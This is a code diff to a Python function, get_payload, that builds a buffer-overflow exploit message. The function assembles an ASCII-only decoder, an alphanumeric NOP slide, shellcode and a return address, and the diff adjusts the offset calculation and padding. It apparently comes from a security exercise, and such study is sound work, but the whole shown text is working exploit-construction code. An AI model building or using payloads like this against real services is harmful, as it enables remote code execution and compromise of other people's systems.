@@ -47,11 +47,9 @@ def get_payload():
     # put offset to shellcode in eax
     instructions.append('push esp')
     instructions.append('pop eax')
-    instructions.append('add eax, 0x50005000')
-    instructions.append('sub eax, 0x50005100')
-    # now eax has esp-256
-    for i in range(0x100 - len(shellcode) - 4):
-        instructions.append('inc eax')
+    # now eax has esp
+    for i in range(len(shellcode) + 4):
+        instructions.append('dec eax')
     # init ebx
     instructions.append('push 0')
     instructions.append('pop ebx')
@@ -67,17 +65,18 @@ def get_payload():
     decoder = ''.join((inst + '\n') for inst in instructions)
     asm_decoder = assemble.assemble_data(decoder)
     # make a multiple of 4
-    nop_len = 4 * ((buf_len - len(asm_decoder) - len(shellcode)) // 4)
+    nop_len = buf_len - len(asm_decoder) - len(shellcode)
     # our nop is of length 2 thats why we need to divide by 2
     # create nop ascii alternative, increment and decrement
+    nop_slide = ''
+    # if nop slide length is odd, we add one byte nop
+    if (nop_len % 2 != 0):
+        nop_slide += assemble.assemble_data('inc ebx\n')
+        nop_len -= 1
     ascii_nop = assemble.assemble_data('inc ebx\ndec ebx')
-    nop_slide = ascii_nop * (nop_len // 2)
+    nop_slide += ascii_nop * (nop_len // 2)
     # suffix padding, between the end of the shell code and
-    padding_len = buf_len - len(shellcode) - len(asm_decoder) - nop_len
-    # problem can occur if length of padding is odd because our nop is of
-    # length 2
-    padding = 'p' * padding_len
-    message = ''.join([nop_slide, asm_decoder, shellcode, padding, addr])
+    message = ''.join([nop_slide, asm_decoder, shellcode, addr])
     payload = network_order_uint32(len(message)) + message
     # print(len(payload))
     return payload
